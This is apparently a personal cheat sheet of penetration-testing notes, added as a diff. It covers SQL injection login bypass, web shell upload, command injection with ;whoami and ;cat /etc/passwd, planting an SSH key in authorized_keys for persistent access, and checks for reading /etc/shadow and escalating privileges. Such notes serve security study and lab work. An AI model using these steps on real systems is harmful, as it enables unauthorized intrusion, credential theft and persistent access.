@@ -1,0 +1,73 @@
+SQL injection into the username and pasword fields----------------------------------------------------------
+
+bob' OR 1='1 goes into both fields
+
+capture the request in the inspetion menu 
+
+copy the raw request and paste it behiend the .php and make sure to put a ? EX: login.php?faijniafnianjnian
+
+to read better view source 
+
+malicuos softwaare upload----------------------------------------------------------------------------------------------------------
+
+if port 80 is open use the --script=http-enum shows availible WEB DIRECTORIES, robots.txt also shows WEB DIRECTORIES
+
+when you find the place to upload it upload the web shell file
+
+go to the /uploads web directory execute the .php file
+
+comand injection on an intup field for example read files (cat) ping a system (ping)
+
+use ;<command> to inject the commands like ls or what have you, if teir are multiple fields on the same page test all of them, if you cant find credentials use ssh key upload
+
+SSH key upload -----------------------------------------------------------------------
+
+when you upload upload the PUBLIC key
+
+in the command injection text box type ;whoami 
+
+then ;cat /etc/passwd so you can find the home directory of the user you just idenfied as 
+
+run ;ls -lisa <home dir>
+
+use ;mkdir <home dir>.ssh to create an ssh directory
+
+input ; echo "<public ssh key>" > <home dir>/.ssh/authorized_keys then send it
+
+to check ;cat the document we just made
+
+if its there you should be able to ssh into the box
+
+if you find someone elses private key use ssh -i <absolute path of private key> user@ip
+
+post exploit ------------------------------------------------------
+
+/etc/host /etc/passwd /etc/shadow
+
+/etc/crotab /var/spool/cron/crontabs
+maybe poke around the rsyslog files
+
+prov esc----------------------------------------------------------------------
+
+sudo -l 
+
+looking at the suid and sgids
+
+reverse engineering------------------------------------------------------------
+
+re means revese engineering
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
